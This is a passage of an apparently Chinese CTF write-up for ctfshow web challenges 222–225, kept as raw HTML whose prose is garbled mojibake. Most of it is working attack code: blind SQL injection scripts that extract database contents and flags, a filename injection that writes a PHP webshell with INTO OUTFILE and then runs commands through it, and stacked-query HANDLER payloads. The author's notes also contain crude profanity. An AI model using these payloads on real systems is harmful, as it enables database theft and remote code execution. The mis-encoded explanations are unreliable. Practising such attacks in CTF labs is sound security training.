class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form.on(<span class="string">&#x27;submit(*)&#x27;</span>, function(data)&#123;</span><br><span class="line">    var table = layui.table;</span><br><span class="line">    table.reload(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      url:<span class="string">&#x27;api/?u=username&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> false; </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  $sql = select * <span class="keyword">from</span> ctfshow_user group by $username;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨æ—¶é—´ç›²æ³¨å³å¯ï¼š<br>æµ‹è¯•æ—¶ä¼šå‘ç°sleepçš„å€¼ä¼šè¢«æ–¹æ³•äºŒåå€ã€‚<br><code>?u=sleep(0.5)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689331879814-ce852ff0-cdee-4a48-9eda-66304003d4b5.png" alt="image.png"><br>ç„¶åå°±ä½¿ç”¨ä¹‹å‰çš„æ—¶é—´ç›²æ³¨è„šæœ¬å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0750fdff-bead-49bc-b6cb-501f23e1457d.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789,&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flaga&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flaga),1,48)&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(0.05),1)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url + payload.<span class="built_in">format</span>(inside, i, j), timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="web223ï¼ˆå‹¾å§é¢˜ï¼Œåšç ´é˜²äº†ï¼‰"><a href="#web223ï¼ˆå‹¾å§é¢˜ï¼Œåšç ´é˜²äº†ï¼‰" class="headerlink" title="web223ï¼ˆå‹¾å§é¢˜ï¼Œåšç ´é˜²äº†ï¼‰"></a>web223ï¼ˆå‹¾å§é¢˜ï¼Œåšç ´é˜²äº†ï¼‰</h1><p>æç¤ºç”¨æˆ·åä¸èƒ½ç”¨æ•°å­—ï¼Œå› æ­¤å¯ä»¥ç”¨trueä»£æ›¿ï¼Œä½†æ˜¯ç”¨trueçš„ä»£ä»·å°±æ˜¯ä¸€æ¬¡å¾ªç¯20sï¼Œé‚£å°±ç”¨å¸ƒå°”ç›²æ³¨ä»£æ›¿ã€‚<br>çœ‹äº†wpå‘ç°ä½¿ç”¨çš„éå¸¸å·§å¦™ï¼š<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(true,username,false)</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿”å›trueæ—¶ï¼Œå°±ä¼šæ‰§è¡Œ<code>group by username</code>ï¼Œå¯¼è‡´å‚æ•°å˜å¤šï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334070399-917c5ad2-3dc9-4c8b-b024-ab234ed78616.png" alt="image.png"><br>è€Œfalseæ—¶ï¼Œè¿”å›falseå­—ç¬¦ä¸²ï¼Œæ•°æ®å°±ç›¸å¯¹è¾ƒå°‘ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334102676-c0d798b5-618c-4450-98f9-f1ee4247ba16.png" alt="image.png"><br>å› æ­¤å¯ä»¥åšå‡ºç›²æ³¨ï¼Œæ„å»ºè„šæœ¬:<br>æ³¨æ„ï¼Œè¿™é‡Œè¿‡æ»¤äº†æ•°å­—1ï¼Œå› æ­¤åªèƒ½ç”¨trueä»£æ›¿ã€‚<br>ç»™æˆ‘æ€äº†æŠŠ å‚»é€¼é¢˜ï¼Œå‹¾å§è„šæœ¬çœŸä¸çŸ¥é“å“ªé”™äº†ï¼šï¼ˆè¿™ä¸ªè„šæœ¬å‡ºä¸æ¥ï¼Œä½†æ˜¯çœŸä¸æƒ³æ”¹äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨3.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 19:29   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_true</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    res += (num - <span class="number">1</span>) * <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkNum</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">elif</span> s <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> calculate_true(<span class="built_in">int</span>(s))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://364e23b2-79ce-4183-a604-8d8d1666bd18.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line">inside = <span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),username,false)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        nurl = url</span><br><span class="line">        nurl += payload.<span class="built_in">format</span>(inside, calculate_true(i), checkNum(j)).replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;true&#x27;</span>) <span class="comment"># 1è¢«è¿‡æ»¤äº†ï¼Œåˆ«å¿˜äº†</span></span><br><span class="line">        r = requests.post(nurl)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="comment"># print(nurl)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;AUTO&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹è¿œå¤„çš„æ­£ç¡®è„šæœ¬å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;true%2b&#x27;</span> * (num-<span class="number">1</span>) + <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">a = num2true(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="built_in">min</span>,<span class="built_in">max</span> = <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == j):</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†å€¼</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),<span class="subst">&#123;num2true(i)&#125;</span>,true))&lt;<span class="subst">&#123;num2true(j)&#125;</span>,username,true)&quot;</span></span><br><span class="line">        r = requests.get(url=url+payload).text</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:å­¤æ¡œæ‡¶å¥‘</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateNum</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num-<span class="number">1</span>):</span><br><span class="line">            res += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,ï¼Œ&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------æŸ¥è¡¨</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment">#--------æŸ¥å­—æ®µ</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagas&#x27;&quot;</span></span><br><span class="line"><span class="comment">#--------æŸ¥flag</span></span><br><span class="line">sql= <span class="string">&quot;select flagasabc from ctfshow_flagas&quot;</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((&#123;&#125;),&#123;&#125;,true))=(&#123;&#125;),username,false)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡æ•°</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        result_num=generateNum(i)</span><br><span class="line">        result=generateNum(j)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;u&#x27;</span> : payload.<span class="built_in">format</span>(sql,result_num,result)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;userAUTO&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] å¼€å§‹ç›²æ³¨ç¬¬&#123;&#125;ä½&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤ªé‡é‡çº§äº†ï¼Œæˆ‘æ‹¼ä¸ªåŠå¤©é‚£ä¸ªæµ‹è¯•payloadå°±æ˜¯ä¸å¯¹ï¼Œtrueæ‹¼æ¥å’‹æ‹¼å’‹ä¸å¯¹ï¼Œè‰æ³¥é©¬ï¼Œå‚»é€¼sqlæ³¨å…¥ä½ å¦ˆå¦ˆæ­»äº†ã€‚<br>ä¸ç”¨asciæ‹¼åˆ°substré‡Œå°±æ˜¯ä¸è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=<span class="keyword">if</span>(substr((database()),(true),true)=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå°±è¡Œ<br>ç¬¬äºŒä¸ªå°±ä¸è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cd6ed-c9e2-47c0-8f98-045fe552c6cd.challenge.ctf.show/api/?u=<span class="keyword">if</span>(mid((database()),(true+true),(true))=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p>ä¼¼ä¹ä¸æ˜¯sqlæ³¨å…¥ï¼Œè€Œæ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚<br> å®é™…ä¸Šrobots.txtèƒ½æ‰«å‡ºæ¥æœ‰ä¿®æ”¹å¯†ç çš„ä½ç½®ï¼Œä¿®æ”¹å¯†ç ä¹‹åç™»å½•æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690440405918-9387ad36-0b95-4e7a-8698-b57c6f13a676.png" alt="20201128094552251.png"><br>æ–‡ä»¶åæ³¨å…¥ï¼Œå†™å…¥æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File <span class="string">&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;; --+</span></span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¸ºï¼š<code>payload.bin</code>å…¶ä¸­åå…­è¿›åˆ¶ä¸ºï¼š<code>&lt;?=``$_GET[1]?``&gt;</code>ï¼Œç„¶åè®¿é—®1.phpä¼ å‚1RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>.php?<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h3 id="handlerï¼Œé¢„å¤„ç†"><a href="#handlerï¼Œé¢„å¤„ç†" class="headerlink" title="handlerï¼Œé¢„å¤„ç†"></a>handlerï¼Œé¢„å¤„ç†</h3><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> handlerå®˜æ–¹æ–‡æ¡£</p></blockquote><p>æ²¡è¿‡æ»¤showå­—ç¬¦ï¼š<code>ctfshow&#39;;show tables;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_flagasa&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_user&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>ç”¨handlerè¯»å–ï¼š<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;flagas&quot;</span>:<span class="string">&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;you get it&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h2 id="è‡³äºä»€ä¹ˆæ˜¯handlerï¼š"><a href="#è‡³äºä»€ä¹ˆæ˜¯handlerï¼š" class="headerlink" title="è‡³äºä»€ä¹ˆæ˜¯handlerï¼š"></a>è‡³äºä»€ä¹ˆæ˜¯handlerï¼š</h2><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­ï¼Œä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure><h2 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h2><p>é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢ SQL æ³¨å…¥ã€‚ã€€MySQL é¢„å¤„ç†è¯­å¥çš„æ”¯æŒç‰ˆæœ¬è¾ƒæ—©ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›®å‰æ™®éä½¿ç”¨çš„ MySQL ç‰ˆæœ¬éƒ½æ˜¯æ”¯æŒè¿™ä¸€è¯­æ³•çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="comment">//é¢„å®šä¹‰SQLè¯­å¥</span></span><br><span class="line">EXECUTE name;  <span class="comment">//æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥</span></span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  <span class="comment">//åˆ é™¤é¢„å®šä¹‰SQL        